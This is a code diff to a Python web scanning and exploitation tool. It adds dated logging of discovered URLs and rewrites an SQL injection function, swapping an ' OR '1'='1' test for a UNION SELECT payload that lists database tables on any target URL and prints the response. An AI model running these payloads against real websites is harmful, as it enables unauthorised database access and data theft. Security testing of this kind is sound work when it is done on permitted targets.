@@ -8,6 +8,8 @@ import requests
 import re
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin
+import logging
+from datetime import datetime
 
 click_completion.init()
 
@@ -89,6 +91,15 @@ def version():
 def map(url):
     # Step 1: Discover URLs on the website
     discovered_urls = discover_urls(url)
+    current_datetime = datetime.now()
+    current_time_str = current_datetime.strftime("%Y%m%d")
+    logname = f"logs/map_{current_time_str}.log"
+    logging.basicConfig(filename=logname,
+                        filemode='a',
+                        format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
+                        datefmt='%H:%M:%S',
+                        level=logging.INFO)
+    logging.info(discovered_urls)
     rprint(
         f"[bold cyan]Discovered {len(discovered_urls)} URLs on {url}:[/bold cyan]\n")
     for i, discovered_url in enumerate(discovered_urls, start=1):
@@ -246,17 +257,30 @@ def is_file_upload_vulnerable(url):
     return False
 
 
+# def exploit_sql_injection(url):
+#     # Placeholder function for exploiting SQL injection vulnerability
+#     rprint(
+#         f"[bold red]Exploiting SQL injection vulnerability on {url}[/bold red]")
+#     # Example:
+#     # Inject SQL code to retrieve sensitive data or manipulate the database
+#     # e.g., SELECT * FROM users WHERE username='admin' AND password='12345'
+#     # Perform the SQL injection attack and observe the response
+#     response = requests.get(url + "?id=' OR '1'='1'")
+#     rprint(
+#         f"[bold red]Response after exploiting SQL injection: {response.text} [/bold red]")
+
 def exploit_sql_injection(url):
-    # Placeholder function for exploiting SQL injection vulnerability
-    rprint(
-        f"[bold red]Exploiting SQL injection vulnerability on {url}[/bold red]")
-    # Example:
-    # Inject SQL code to retrieve sensitive data or manipulate the database
-    # e.g., SELECT * FROM users WHERE username='admin' AND password='12345'
+    # Exploiting SQL injection vulnerability
+    print(f"Exploiting SQL injection vulnerability on {url}")
+
+    # Inject SQL code to retrieve data from a database
+    payload = "?id=1' UNION SELECT table_name FROM information_schema.tables--"
+
     # Perform the SQL injection attack and observe the response
-    response = requests.get(url + "?id=' OR '1'='1'")
-    rprint(
-        f"[bold red]Response after exploiting SQL injection: {response.text} [/bold red]")
+    response = requests.get(url + payload)
+
+    # Print the response after exploiting SQL injection
+    print(f"Response after exploiting SQL injection: {response.text}")
 
 
 def exploit_xss_vulnerability(url):
